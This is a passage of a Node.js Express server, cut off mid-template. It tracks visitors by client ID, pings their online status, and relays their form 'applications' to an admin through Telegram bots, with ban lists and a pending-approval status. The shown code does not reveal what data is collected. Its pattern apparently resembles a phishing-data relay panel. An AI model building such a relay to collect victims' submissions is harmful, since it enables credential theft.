const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  next();
});

const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

const adminId = Number(process.env.ADMIN_CHAT_ID);

// базы
let bannedUsers = {};
let userStatus = {};
let seenUsers = {};
let onlineUsers = {};
let requestTexts = {};

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return (Date.now() - onlineUsers[id]) < 15000;
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;

  onlineUsers[id] = Date.now();

  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`);
  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ОТПРАВКА =====
app.post("/send", (req, res) => {
  const data = req.body;
  const id = data.clientId;

  if (bannedUsers[id]) return res.json({ ok: false });

  userStatus[id] = "wait";

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const baseText = `${statusText}

🆔 ID: ${id}

📦 ${data
